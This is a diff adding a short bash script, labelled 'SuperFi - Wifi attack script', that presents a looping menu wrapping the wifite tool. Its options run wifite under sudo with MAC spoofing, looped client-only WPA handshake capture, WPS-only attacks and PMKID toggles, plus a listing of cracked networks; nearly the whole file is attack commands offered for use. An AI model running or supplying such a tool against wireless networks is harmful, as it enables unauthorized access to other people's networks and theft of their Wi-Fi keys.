@@ -1,0 +1,63 @@
+#!/bin/bash
+
+#SuperFi - Wifi attack script
+
+while true
+
+do
+
+blueback='\e[0;44m'
+greyback='\e[1;40m'
+red='\e[1;31m'
+green='\e[1;32m'
+aqua='\e[1;36m'
+blue='\e[1;34m'
+echo -e $greyback""$aqua
+echo "                                        "
+echo "        %%%%%%%%%%%%%%%%%%%%%%%%%       "
+echo "      %%  %%%%%%%%%%%%%%%%%%%%%  %%     "
+echo "    %%  %%%%%             %%%%%%%  %%   "
+echo "  %%  %%%%%%                         %% "
+echo "    %% %%%%%%%%%%%%%%%%%%%%%%%     %%   "
+echo "      %% %%%%%%%%%%%%%%%%%%%%%%%%%%     "
+echo "        %%                %%%%%%%       "
+echo "          %% %%%%%%      %%%%%%         "
+echo "            %%%%%%%%%%%%%%%%%           "
+echo "              %% %%%%%%% %%             "
+echo "                %%     %%               "
+echo "                  %%%%%                 "
+echo "                SimpleFite              "
+echo -e "                   BETA                 "$blue
+
+echo "  1. Clients only "
+echo "  2. Basic wifite scan "
+echo "  3. Clients only loop "
+echo "  4. Clients only loop(--no-pmkid) "
+echo "  5. Clients only loop(--no-wps) "
+echo "  6. Clients only loop(--no-pmkid --no-wps) "
+echo "  7. WPS only loop "
+echo "  8. Cracked "
+
+read superfite;
+
+	case $superfite in
+		1) sudo xterm -e wifite -mac -p 120 --clients-only
+		;;
+		2) sudo xterm -e wifite -mac -p 120
+		;;
+		3) sudo xterm -e wifite -mac -p 120 --wpadt 20 --wpat 134 --clients-only -inf
+		;;
+		4) sudo xterm -e wifite -mac -p 120 --wpadt 20 --wpat 134 --clients-only -inf --no-pmkid
+		;;
+		5) sudo xterm -e wifite -mac -p 120 --wpadt 20 --wpat 134 --clients-only -inf --no-wps 
+		;;
+		6) sudo xterm -e wifite -mac -p 120 --wpadt 20 --wpat 134 --clients-only -inf --no-pmkid --no-wps
+		;;
+        7) sudo xterm -e wifite -mac -p 120 --wps --wps-only
+        ;;
+		8) sudo wifite --cracked
+		;;
+	esac
+	
+	
+done
